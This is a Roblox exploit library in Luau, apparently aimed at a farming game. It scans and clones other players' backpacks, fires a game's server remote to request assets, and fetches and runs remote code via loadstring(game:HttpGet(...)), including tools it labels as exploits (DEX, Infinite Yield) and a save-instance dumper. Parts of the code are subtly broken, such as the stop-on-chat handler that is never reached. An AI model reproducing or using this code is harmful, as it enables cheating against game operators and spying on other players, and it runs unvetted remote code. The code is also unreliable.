local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer

local Library = {
	WorkspaceReplicationConnection = nil
}

Library.LocalPlayer = LocalPlayer

function Library:ConvertStringsToLower(...)
	
	assert(type(...) == "table", ":ConvertStringsToLower(), not a table.")

	local Clone = table.clone(...)

	for Index, String in pairs(Clone) do
		Clone[Index] = String:lower()
	end

	return Clone

end

function Library:GetFolderIn(Parent: Instance, Name: string)
	
	assert(typeof(Parent) == "Instance", ":GetFolderIn(), parent is not an instance.")

	local MainFolder = Parent:FindFirstChild(Name)

	if not MainFolder then

		local NewFolder = Instance.new("Folder", Parent)
		NewFolder.Name = Name

		MainFolder = NewFolder

	end

	return MainFolder

end

function Library:CleanSeedName(CurrentName: string)
	
	assert(type(CurrentName) ~= "table", ":CleanSeedName(), needs to be a string | number.")
	assert(typeof(CurrentName) ~= "Instance", ":CleanSeedName(), needs to be a string | number.")
	assert(type(CurrentName) ~= "function", ":CleanSeedName(), needs to be a string | number.")

	CurrentName = tostring(CurrentName)

	CurrentName = CurrentName:gsub("%s*Seed%s*", "")
	CurrentName = CurrentName:gsub("%s*%[.-%]", "")
	CurrentName = CurrentName:gsub("%s+$", "")

	return CurrentName

end

function Library:IsDuplicate(Parent: Instance, Name: string)
	
	assert(typeof(Parent) == "Instance", ":IsDuplicate(), parent is not an instance.")

	for _, Object in pairs(Parent:GetChildren()) do

		if Object.Name:lower():find(tostring(Name):lower()) then
			return true
		end

	end

	return false

end

function Library:ExtractSeedModel(Tool: Tool)
	
	assert(typeof(Tool) == "Instance" or typeof(Tool) == "Tool", ":ExtractSeedModel(), Not an instance / tool.")

	local FindSeed = Tool:FindFirstChild("Handle") or Tool:FindFirstChildWhichIsA("Part")

	if FindSeed then

		local Extracted = FindSeed:Clone()

		Extracted:SetAttribute("ORIGINAL_NAME", Tool.Name)

		local CleanName = Library:CleanSeedName(Tool.Name)

		Extracted.Name = CleanName

		return Extracted

	else

		return Tool:Clone()

	end

end

function Library:DisplayResults(Found: {}, FoundDuplicates: {})
	
	assert(type(Found) == "table", ":DisplayResults(), no table provided (found)")
	assert(type(FoundDuplicates) == "table", ":DisplayResults(), no table provided (dupli)")

	if #Found == 0 then

		if #FoundDuplicates ~= 0 then
			print(("None were found, just %* duplicate%*. (%*)"):format(#FoundDuplicates, #FoundDuplicates == 1 and "" or "s", table.concat(FoundDuplicates, ", ")))
		else
			print("None were found.")
		end

	else

		print(("Found %*!"):format(table.concat(Found, ", ")))

		if #FoundDuplicates ~= 0 then
			print(("And duplicate%*: %*"):format(#FoundDuplicates == 1 and "" or "s", table.concat(FoundDuplicates, ", ")))
		end

	end

end

function Library:ScanServer(ScanFor: {}, Configuration: {})
	
	assert(type(ScanFor) == "table", ":ScanServer(), nothing to scan for?")
	assert(type(Configuration) == "table", ":ScanServer(), invalid configuration.")

	local MainFolder = Library:GetFolderIn(workspace, Configuration.Storages.Main or "HS")

	local Found = {}
	local FoundDuplicates = {}

	local PlantFolder = Library:GetFolderIn(MainFolder, Configuration.Storages.Plants or "P")
	local SeedsFolder = Library:GetFolderIn(MainFolder, Configuration.Storages.Seeds or "S")
	local Duplicates

	if Configuration.Duplicates.StoreDuplicates then
		Duplicates = Library:GetFolderIn(MainFolder, Configuration.Storages.Duplicates or "D")
	end

	local function ScanPlants()

		for _, Farm: Folder in pairs(workspace:FindFirstChild("Farm"):GetChildren()) do

			local FarmPlants: Folder = Farm:FindFirstChild("Important"):FindFirstChild("Plants_Physical")

			if FarmPlants then

				for _, Plant: Model in pairs(FarmPlants:GetChildren()) do

					if table.find(ScanFor, Plant.Name:lower()) then

						Plant:Clone().Parent = PlantFolder

						table.insert(Found, "PLANT | " .. Plant.Name)

						print(("FOUND PLANT: %*"):format(Plant.Name))

					end

				end

			else

				print("Farm has no plants???")

			end

		end

	end

	local function ScanSeeds()

		for _, Player: Player in pairs(Players:GetPlayers()) do

			local Backpack: Backpack = Player:FindFirstChild("Backpack")

			if Backpack then

				for _, Object in pairs(Backpack:GetChildren()) do

					for _, HuntFor in pairs(ScanFor) do

						if Object.Name:lower():find(HuntFor) and Object.Name:lower():find("seed") then

							local CleanName = Library:CleanSeedName(Object.Name)

							if Library:IsDuplicate(SeedsFolder, CleanName) and Configuration.Duplicates.StoreDuplicates and not Configuration.Duplicates.IgnoreDuplicates then

								Library:ExtractSeedModel(Object).Parent = Duplicates

								table.insert(FoundDuplicates, CleanName)

								print(("%* appears to be a duplicate. Adding to duplicates."):format(CleanName))

								return

							end

							table.insert(Found, "SEED | " .. (CleanName or "???"))

							Library:ExtractSeedModel(Object).Parent = SeedsFolder

							print(("FOUND SEED: %*"):format(HuntFor))

						end

					end

				end

			else

				print(("%* has no backpack???"):format(Player.Name))

			end

		end

	end

	if Configuration.ScanType == "Seed" then

		ScanSeeds()

	elseif Configuration.ScanType == "Plant" then

		ScanPlants()

	else

		ScanPlants()
		ScanSeeds()

	end

	return Found, FoundDuplicates

end

function Library:StartScan(List: {}, Configuration: {})

	assert(type(List) == "table", "Please provide a table with things you want to scan.")

	if Configuration.Automation.Auto or false then

		print("[Automation]: started.")

		local Break = false

		while task.wait(Configuration.Automation.ScanStep or 10) do

			print("[Automation]: scanning...")

			if Break then
				break
			end

			Library:DisplayResults(
				Library:ScanServer(
					Library:ConvertStringsToLower(List, Configuration), Configuration
				)
			)

		end

		local ChatConnection

		ChatConnection = LocalPlayer.Chatted:Connect(function(Message: string)

			if Message:lower():find(Configuration.Automation.StopOnChat:lower() or "") then

				Break = true

				ChatConnection:Disconnect()

				print("[Automation]: stopped.")

			end

		end)

	else

		Library:DisplayResults(
			Library:ScanServer(
				Library:ConvertStringsToLower(List, Configuration), Configuration
			)
		)

	end

end

local ParticleEmitterProperties = {

	"LightEmission",
	"LightInfluence",
	"LockedToPart",
	"ZOffset",

	"Color",
	"Transparency",
	"Size",
	"Texture",

	"FlipbookFramerate",
	"FlipbookLayout",
	"FlipbookMode",
	"FlipbookStartRandom",

	"EmissionDirection",
	"Rate",
	"Rotation",
	"RotSpeed",
	"Speed",
	"VelocityInheritance",

	"Lifetime",
	"LifetimeSpread",
	"SpreadAngle",
	"TimeScale",

	"Shape",
	"ShapeInOut",
	"ShapePartial",
	"ShapeStyle",

	"Acceleration",
	"Drag",
	"VelocitySpread",

	"InheritColor",
	"InheritTransparency",
	"InheritSize",
	"InheritVelocity",

	"Squash",
	"Stretch",

}

function Library:GetAllWithNames(Parent: Instance, Name: string, AllowedClass: string)
	
	assert(typeof(Parent) == "Instance", ":Compare(), object is not an instance.")
	
	local Collected = {}

	for _, Object in pairs(Parent:GetChildren()) do

		if Object.Name == Name and (not AllowedClass or Object:IsA(AllowedClass)) then
			table.insert(Collected, Object)
		end

	end

	return Collected

end

function Library:Compare(Object: Instance, Parent: Instance, Name: string)
	
	assert(typeof(Object) == "Instance", ":Compare(), object is not an instance.")
	assert(typeof(Parent) == "Instance", ":Compare(), parent is not an instance.")
	
	local Other = Library:GetAllWithNames(Parent, tostring(Name), "ParticleEmitter")

	if #Other == 0 then
		return true
	end

	local Different = {}

	local function FindDifference()

		for _, ParticleEmitter in pairs(Other) do

			for _, PropertyName in pairs(ParticleEmitterProperties) do

				if Different[ParticleEmitter] then
					continue
				end

				if tostring(Object[PropertyName]) ~= tostring(ParticleEmitter[PropertyName]) then
					Different[ParticleEmitter] = true
				end

			end

		end

	end

	local Success, ErrorMessage = pcall(FindDifference)

	if not Success then
		wait("Failed finding differences!")
		return false
	end

	for Emitter, FoundDifference in pairs(Different) do

		if FoundDifference == true then
			return true
		end

	end

	return false

end

function Library:CollectMutationFX(Data: {})
	
	assert(type(Data) == "table", ":CollectMutationFX(), a table with all mutations & tags needs to be provided.")
	
	local MainFolder = Library:GetFolderIn(workspace, "Mutation_FX")
	
	for Name, Data in pairs(Data) do

		local MutationFolder = Library:GetFolderIn(MainFolder, Name)

		local MuationTagFormat = ("Cleanup_%*"):format(Data.Tag)

		for _, Object: ParticleEmitter? in pairs(CollectionService:GetTagged(MuationTagFormat)) do

			if not MutationFolder:FindFirstChild(Object.Name) then

				local NewObject = Object:Clone()

				NewObject.Parent = MutationFolder

			else

				if Library:Compare(Object, MutationFolder, Object.Name) then

					local NewObject = Object:Clone()

					NewObject.Parent = MutationFolder

				end

			end

		end

	end
	
end

function Library:AnchorAll(...)
	
	assert(typeof(...) == "Instance", ":AnchorAll(), An instance must be provided.")
	
	if (...):IsA("BasePart") then
		(...).Anchored = true
	end
	
	for _, Part: BasePart in pairs((...):GetDescendants()) do 
		
		if Part:IsA("BasePart") then 
			
			Part.Anchored = true
			
		end 
		
	end 
	
end

function Library:AssetRequest(Requesting: {}, Replicate: boolean)
	
	assert(type(Requesting) == "table", ":AssetRequest(), Please provide a table with items you want to request.")
	
	if not Replicate and Library.WorkspaceReplicationConnection then
		
		Library.WorkspaceReplicationConnection:Disconnect()
		
	elseif not Library.WorkspaceReplicationConnection then
		
		Library.WorkspaceReplicationConnection = LocalPlayer.PlayerGui:WaitForChild("ReplicatedAssets").ChildAdded:Connect(function(Child: Instance)

			local NewChild = Child:Clone()

			Library:AnchorAll(NewChild)

			NewChild.Parent = workspace

			print(("CHILD ADDED: %* & REPLICATED"):format(Child.Name))

		end)
		
	end
	
	local Channel = game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("ReplicationChannel")

	for _, Try in pairs(Requesting) do

		print(("ATTEMPTING %*"):format(Try))

		Channel:FireServer(Try) task.wait()

	end
	
end

function Library:CloneBackpacks(IgnoreLocalPlayer: boolean)
	
	local BackpackStorage = Library:GetFolderIn(workspace, "PlayerBackpacks")
	
	for _, Player in pairs(Players:GetPlayers()) do
		
		if Player == Library.LocalPlayer then
			continue
		end

		local Backpack = Player:FindFirstChild("Backpack")

		if Backpack then

			local PlayerBackpack = Library:GetFolderIn(BackpackStorage, ("%*'s Backpack"):format(Player.Name or "???"))

			print(("Instanced new backpack for player %*."):format(Player.Name))

			for _, Item in pairs(Backpack:GetChildren()) do

				local NewItem = Item:Clone()
				NewItem.Parent = PlayerBackpack

			end

		end

	end
	
end

function Library:SaveInstance(Configuration: {})
	
	local Save = loadstring(game:HttpGet("https://raw.githubusercontent.com/luau/SynSaveInstance/main/saveinstance.luau", true), "saveinstance")()
	
	if Save then
		
		Save(Configuration or {})
		
	else
		
		print("No save function.")
		
	end
	
end

function Library:SetupLocalPlayer()
	
	local LocalPlayerInstances = Library:GetFolderIn(game, "LocalPlayer")
	
	for _, Object in pairs(game:GetService("Players").LocalPlayer:GetChildren()) do

		local ObjectStorage = Library:GetFolderIn(LocalPlayerInstances, Object.Name)

		for _, Child in pairs(Object:GetChildren()) do

			Child:Clone().Parent = ObjectStorage

		end

	end
	
end

function Library:AdvancedDecompile(Configuration: {})
	
	Configuration = Configuration or {
		DecompileLocalPlayer = true,
		DecompileScripts = false,
		DecompileInstancesWithParentNil = true,
		DecompilePlayerCharacters = true
	}
	
	if Configuration.DecompileLocalPlayer then 
		Library:SetupLocalPlayer()
	end
	
	Library:SaveInstance({
		noscripts = not Configuration.DecompileScripts,
		NilInstances = Configuration.DecompileInstancesWithParentNil,
		RemovePlayerCharacters = not Configuration.DecompilePlayerCharacters,
	})
	
end

function Library:ExtractKeys(...: {})
	
	local Array = {}
	
	for Key in pairs(...) do
		table.insert(Array, Key)
	end
	
	return Array
	
end

function Library:Load(Type: string)
	
	Type = Type and tostring(Type):lower() or "info"
	
	local Exploits = Library:ConvertStringsToLower({

		["DEX"] = function()
			return game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua")
		end,

		["Infinite Yield"] = function()
			return game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
		end,

	})
	
	if Exploits[Type:lower()] then
		
		local Executed, Result = pcall(function()
			loadstring(Exploits[Type:lower()])()
		end)
		
		if Executed then
			
			print("Successfully executed", Type:lower())
			
		else
			
			warn("Error while executing", Type:lower(), "reason: ", tostring(Result))
			
		end
		
	else
		
		print("Current exploits:", table.concat(Library:ExtractKeys(Exploits), ", "))
		
	end
	
end

return Library
